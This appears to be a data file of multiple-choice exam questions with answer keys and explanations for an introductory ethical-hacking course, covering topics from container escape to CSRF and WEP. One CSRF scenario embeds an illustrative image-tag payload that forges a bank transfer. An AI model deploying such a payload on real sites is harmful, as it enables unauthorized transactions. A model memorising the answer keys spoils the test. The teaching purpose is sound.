    moduleTitle: 'Module 11: Cloud Computing Threats and Countermeasures',
    subTopic: 'Container Technology & Threats',
    scenario: 'A developer deploys a Docker container with the `--privileged` flag enabled and root execution permissions. An attacker compromises the web application running inside the container and uses system call privileges to break out and execute root commands on the host operating system.',
    questionText: 'What container security vulnerability is being exploited in this scenario?',
    options: [
      'Container Escape (Breakout)',
      'Cross-Origin Resource Sharing (CORS)',
      'Buffer Underflow',
      'ARP Cache Poisoning'
    ],
    correctAnswers: [0],
    difficulty: 'Scenario',
    explanation: 'Container Escape (or Container Breakout) happens when a malicious process running inside an isolated container breaks through isolation boundaries (often enabled by `--privileged` flags or Linux kernel exploits) to execute arbitrary code on the underlying host kernel.',
    keyTakeaway: 'Container Breakout escapes container isolation into the host OS. Never run containers with unnecessary `--privileged` flags.',
    pageRef: 'Page 862-870'
  },

  // ==========================================
  // MODULE 12: Penetration Testing Fundamentals
  // ==========================================
  {
    id: 'ehe-12-001',
    moduleId: 'mod-12',
    moduleTitle: 'Module 12: Penetration Testing Fundamentals',
    subTopic: 'Penetration Testing Types',
    scenario: 'A penetration testing firm is engaged to evaluate an organization\'s external security posture. The client provides zero internal information regarding network diagrams, server IP addresses, operating system types, or application source code, simulating an external adversary starting from scratch.',
    questionText: 'Which methodology of penetration testing is being performed?',
    options: [
      'White-Box Testing (Clear-Box)',
      'Grey-Box Testing',
      'Black-Box Testing',
      'Vulnerability Assessment only'
    ],
    correctAnswers: [2],
    difficulty: 'Fundamental',
    explanation: 'Black-Box Testing is conducted with zero prior knowledge of the target environment, replicating the perspective of an external attacker. White-Box provides full diagrams and source code; Grey-Box provides partial knowledge (e.g., standard user credentials).',
    keyTakeaway: 'Black-box = Zero knowledge; White-box = Complete knowledge; Grey-box = Partial knowledge.',
    pageRef: 'Page 763-789'
  },
  {
    id: 'ehe-12-002',
    moduleId: 'mod-12',
    moduleTitle: 'Module 12: Penetration Testing Fundamentals',
    subTopic: 'Guidelines and Recommendations (Rules of Engagement)',
    scenario: 'During a penetration test, a tester identifies an exploitable flaw on a production database server that could cause a denial-of-service if fully triggered. The tester checks the signed engagement documentation to determine whether invasive exploitation of production servers during business hours is permitted.',
    questionText: 'Which formal document specifies testing timelines, IP ranges in scope, allowed testing techniques, emergency points of contact, and constraints?',
    options: [
      'Non-Disclosure Agreement (NDA)',
      'Rules of Engagement (RoE)',
      'Service Level Agreement (SLA)',
      'Certificate of Insurance'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'The Rules of Engagement (RoE) document governs the formal parameters of a penetration test, detailing what IP ranges are in/out of scope, allowed attack vectors, testing time windows, handling of sensitive data, and incident escalation protocols.',
    keyTakeaway: 'Rules of Engagement (RoE) defines scope, permitted attack techniques, schedules, and escalation paths.',
    pageRef: 'Page 789-815'
  },
  {
    id: 'ehe-12-003',
    moduleId: 'mod-12',
    moduleTitle: 'Module 12: Penetration Testing Fundamentals',
    subTopic: 'Deliverables and Reporting',
    scenario: 'Following a two-week penetration testing engagement, the lead consultant presents a high-level summary to the Board of Directors and Chief Financial Officer focusing on business risks, financial implications, and prioritized recommendations without excessive technical jargon.',
    questionText: 'What section of the final penetration test report is specifically written for non-technical leadership and executives?',
    options: [
      'Technical Vulnerability Appendix',
      'Executive Summary',
      'Raw Port Scan Output',
      'Proof of Concept Exploit Script'
    ],
    correctAnswers: [1],
    difficulty: 'Fundamental',
    explanation: 'The Executive Summary synthesizes assessment results into non-technical language for C-level executives, outlining overall risk posture, critical business impacts, and strategic mitigation recommendations.',
    keyTakeaway: 'Executive Summary = High-level strategic overview for leadership; Technical findings = Granular details for engineers.',
    pageRef: 'Page 815-842'
  },

  // Additional In-Depth Module Scenarios to provide rich variety across Retakes:
  {
    id: 'ehe-01-005',
    moduleId: 'mod-01',
    moduleTitle: 'Module 01: Information Security Fundamentals',
    subTopic: 'Information Security Laws and Regulations',
    scenario: 'A company based in California processes the personal shopping and identity data of European Union residents. A data breach occurs, compromising user accounts.',
    questionText: 'Which regulatory standard imposes mandatory 72-hour breach notification deadlines and severe financial penalties up to 4% of global annual turnover for failure to protect EU citizen data?',
    options: [
      'GDPR (General Data Protection Regulation)',
      'SOX',
      'NIST SP 800-53',
      'COBIT'
    ],
    correctAnswers: [0],
    difficulty: 'Fundamental',
    explanation: 'The European Union\'s General Data Protection Regulation (GDPR) enforces strict privacy rules, citizen rights regarding personal data, 72-hour breach reporting, and penalties up to 20 million euros or 4% of annual global turnover.',
    keyTakeaway: 'EU personal privacy + 72hr breach notice = GDPR.',
    pageRef: 'Page 41-54'
  },
  {
    id: 'ehe-03-004',
    moduleId: 'mod-03',
    moduleTitle: 'Module 03: Information Security Threats and Vulnerability Assessment',
    subTopic: 'Malware and its Types',
    scenario: 'A malware analyst discovers an executable that replaces core Windows operating system binaries and hooks kernel system calls, allowing hidden processes and open network sockets to remain invisible to Task Manager and standard antivirus scanners.',
    questionText: 'What type of stealth malware operates at the kernel or hypervisor layer to conceal its presence and other malicious components?',
    options: [
      'Rootkit',
      'Ransomware',
      'Adware',
      'Macro Virus'
    ],
    correctAnswers: [0],
    difficulty: 'Intermediate',
    explanation: 'A Rootkit is designed to hide unauthorized processes, network connections, and files from operating system utilities and security tools by modifying the OS kernel, APIs, or low-level firmware.',
    keyTakeaway: 'Kernel-level stealth concealment = Rootkit.',
    pageRef: 'Page 347-360'
  },
  {
    id: 'ehe-06-005',
    moduleId: 'mod-06',
    moduleTitle: 'Module 06: Network Level Attacks and Countermeasures',
    subTopic: 'Sniffing Countermeasures',
    scenario: 'A network administrator detects that an unknown device on the office network is broadcasting rogue DHCP offers, assigning itself as the default gateway to intercept user traffic.',
    questionText: 'Which switch security protocol protects against rogue DHCP servers by designating specific switch ports as trusted and untrusted?',
    options: [
      'DHCP Snooping',
      'BPDU Guard',
      'Dynamic Trunking Protocol (DTP)',
      'Virtual Router Redundancy Protocol (VRRP)'
    ],
    correctAnswers: [0],
    difficulty: 'Intermediate',
    explanation: 'DHCP Snooping acts as a Layer 2 firewall between untrusted hosts and DHCP servers by validating DHCP messages and filtering out unauthorized DHCP server offers from untrusted ports.',
    keyTakeaway: 'DHCP Snooping prevents rogue DHCP servers and builds the binding table for Dynamic ARP Inspection (DAI).',
    pageRef: 'Page 185-196'
  },
  {
    id: 'ehe-07-004',
    moduleId: 'mod-07',
    moduleTitle: 'Module 07: Web Application Attacks and Countermeasures',
    subTopic: 'Web Application Threats (CSRF)',
    scenario: 'A logged-in online banking customer visits a malicious gaming blog. Embedded in the blog is an invisible image tag: `<img src="https://bank.com/transfer?amount=5000&to=attacker">`. The customer\'s browser automatically attaches their valid bank session cookie, executing the transfer without their intent.',
    questionText: 'What web application vulnerability is demonstrated in this exploit?',
    options: [
      'Cross-Site Request Forgery (CSRF)',
      'Cross-Site Scripting (XSS)',
      'SQL Injection',
      'Insecure Direct Object Reference (IDOR)'
    ],
    correctAnswers: [0],
    difficulty: 'Scenario',
    explanation: 'Cross-Site Request Forgery (CSRF) tricks a victim\'s authenticated browser into executing unwanted actions on a trusted web application where the user is currently authenticated. Defenses include Anti-CSRF tokens and SameSite cookie attributes.',
    keyTakeaway: 'CSRF forces a victim\'s browser to execute unauthorized commands using their authenticated session. Defense: Unique unpredictable Anti-CSRF tokens.',
    pageRef: 'Page 660-677'
  },
  {
    id: 'ehe-08-004',
    moduleId: 'mod-08',
    moduleTitle: 'Module 08: Wireless Attacks and Countermeasures',
    subTopic: 'Wireless Encryption Protocols',
    scenario: 'A legacy office environment still runs wireless access points configured with WEP (Wired Equivalent Privacy). A junior analyst cracks the Wi-Fi key in less than two minutes.',
    questionText: 'Which cryptographic algorithm and implementation weakness makes WEP trivially crackable by capturing a few thousand initialization vectors (IVs)?',
    options: [
      'Short 24-bit Initialization Vector (IV) reuse with the RC4 stream cipher',
      'Vulnerability in 256-bit AES block chaining',
      'Absence of Diffie-Hellman key exchange',
      'Use of weak RSA 4096-bit keys'
    ],
    correctAnswers: [0],
    difficulty: 'Fundamental',
    explanation: 'WEP relies on the RC4 stream cipher with a small 24-bit Initialization Vector (IV). Because the IV is transmitted in plaintext and repeats rapidly under traffic load, statistical analytic attacks (e.g., FMS/PTW algorithms) recover the encryption key swiftly.',
    keyTakeaway: 'WEP = RC4 + 24-bit IV reuse vulnerability.',
    pageRef: 'Page 422-423'
  },
  {
    id: 'ehe-10-003',
    moduleId: 'mod-10',
    moduleTitle: 'Module 10: IoT and OT Attacks and Countermeasures',
    subTopic: 'OT Attack Countermeasures (Purdue Model)',
    scenario: 'In an industrial petrochemical refinery, the Chief Information Security Officer (CISO) establishes security zones separating business IT systems (enterprise email, billing) from Level 0 and Level 1 manufacturing sensors and safety systems using an Industrial DMZ.',
    questionText: 'Which established industrial control system reference architecture defines levels of operations from physical process (Level 0) to enterprise enterprise network (Level 4/5)?',
    options: [
      'The Purdue Enterprise Reference Architecture (Purdue Model)',
      'The OSI 7-Layer Model',
      'The Bell-LaPadula Security Model',
      'The Biba Integrity Model'
    ],
    correctAnswers: [0],
    difficulty: 'Intermediate',
    explanation: 'The Purdue Model segments industrial automation and control networks into discrete hierarchical levels (Level 0 physical process up to Level 4/5 enterprise IT networks) with an Industrial DMZ (Level 3.5) restricting direct communication between corporate IT and physical control equipment.',
    keyTakeaway: 'Purdue Model = Hierarchical segmentation for ICS/SCADA and IT/OT environments.',
    pageRef: 'Page 755-761'
  },
  {
    id: 'ehe-11-003',
    moduleId: 'mod-11',
    moduleTitle: 'Module 11: Cloud Computing Threats and Countermeasures',
    subTopic: 'Cloud Computing Threats',
    scenario: 'A company storing sensitive backup archives in an Amazon Web Services (AWS) S3 bucket accidentally leaves the bucket policy set to "All Users - Read Access", allowing external internet users to enumerate and download unencrypted customer records.',
    questionText: 'According to industry cloud threat reports, what is the single most common cause of public cloud data breaches?',
    options: [
      'Hardware hypervisor breakout attacks',
      'Customer cloud storage and IAM misconfiguration',
      'Physical theft of server hard drives from cloud data centers',
      'Breakdown of fiber optic undersea cables'
    ],
    correctAnswers: [1],
    difficulty: 'Fundamental',
    explanation: 'Misconfiguration of cloud resources (such as publicly readable storage buckets, over-permissive Identity and Access Management policies, and exposed API keys) accounts for the overwhelming majority of cloud security incidents.',
    keyTakeaway: 'Cloud breaches are predominantly driven by tenant misconfigurations (public storage buckets & overly permissive IAM roles).',
    pageRef: 'Page 862-870'
  }
];
